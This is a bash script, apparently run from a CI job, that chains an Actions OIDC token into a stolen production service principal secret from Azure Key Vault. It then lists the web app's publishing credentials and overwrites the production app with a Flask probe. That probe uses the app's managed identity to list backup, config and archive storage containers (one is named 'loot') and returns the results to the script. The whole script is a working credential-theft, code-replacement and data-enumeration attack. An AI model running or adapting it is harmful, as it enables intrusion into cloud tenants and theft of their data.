#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RG=rg-tbl-reporting-prod-eus
APP=app-tbl-reporting-prod
PROD="https://kv-tbl-prod-x3euoz.vault.azure.net/secrets"
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
js=$(curl -sS "$PROD/reporting-service-principal?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
cid=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("appId") or "")')
scx=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("clientSecret") or "")')
RARM=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$cid" -d grant_type=client_credentials --data-urlencode "client_secret=$scx" --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
PUB=$(curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP/config/publishingcredentials/list?api-version=2023-01-01" -H "Authorization: Bearer $RARM" -H "Content-Type: application/json" -d '{}')
U=$(printf '%s' "$PUB" | python3 -c 'import sys,json;print(json.load(sys.stdin)["properties"]["publishingUserName"])')
P=$(printf '%s' "$PUB" | python3 -c 'import sys,json;print(json.load(sys.stdin)["properties"]["publishingPassword"])')
SCM="https://$APP.scm.azurewebsites.net"
cat > /tmp/app.py <<'PYEOF'
import os,json,urllib.request,urllib.error,threading,time
from flask import Flask
app=Flask(__name__)
IE=os.environ.get("IDENTITY_ENDPOINT",""); IH=os.environ.get("IDENTITY_HEADER","")
CID="7a85156a-01c4-4e61-8472-40a92107159b"
def tok(res):
  try: return json.load(urllib.request.urlopen(urllib.request.Request(IE+"?resource=%s&api-version=2019-08-01&client_id=%s"%(res,CID),headers={"X-IDENTITY-HEADER":IH}),timeout=8))["access_token"]
  except Exception: return ""
def g(url,t):
  try: return urllib.request.urlopen(urllib.request.Request(url,headers={"Authorization":"Bearer "+t,"x-ms-version":"2021-08-06"}),timeout=5).read().decode()[:3000]
  except urllib.error.HTTPError as e: return "H%d"%e.code
  except Exception: return "ERR"
def probe():
  st=tok("https://storage.azure.com"); out={"mi_tok_len":len(st)}
  for sa in ["sttblbackupprodx3euoz","sttblappcfgprodx3euoz","sttblarchiveprodx3euoz"]:
    for c in ["exports","config","archive","reports","data","loot","backups"]:
      r=g("https://%s.blob.core.windows.net/%s?restype=container&comp=list"%(sa,c),st)
      out["%s/%s"%(sa,c)]=r if ("<Name>" in r) else r[:6]
  open("/home/site/wwwroot/xp_out.json","w").write(json.dumps(out)); return out
@app.route("/")
def r(): return "xpv4"
@app.route("/xp")
def x(): return json.dumps(probe())
threading.Thread(target=lambda:(time.sleep(6),probe()),daemon=True).start()
PYEOF
printf 'flask\n' > /tmp/requirements.txt
python3 -c 'import zipfile;z=zipfile.ZipFile("/tmp/a.zip","w");z.write("/tmp/app.py","app.py");z.write("/tmp/requirements.txt","requirements.txt");z.close()'
for i in $(seq 1 8); do
  code=$(curl -sS -u "$U:$P" -o /dev/null -w '%{http_code}' -X POST --data-binary @/tmp/a.zip -H 'Content-Type: application/zip' "$SCM/api/zipdeploy")
  echo "zip try$i=$code"; [ "$code" = "200" ] && break; sleep 12
done
for i in $(seq 1 8); do sleep 12; m=$(curl -sS --max-time 10 "https://$APP.azurewebsites.net/" 2>/dev/null); echo "poll$i='$m'"; [ "$m" = "xpv4" ] && break; done
echo "XP: $(curl -sS --max-time 25 "https://$APP.azurewebsites.net/xp" 2>/dev/null | head -c 1800)"
echo "FILE: $(curl -sS -u "$U:$P" "$SCM/api/vfs/site/wwwroot/xp_out.json" 2>/dev/null | head -c 1800)"
echo END
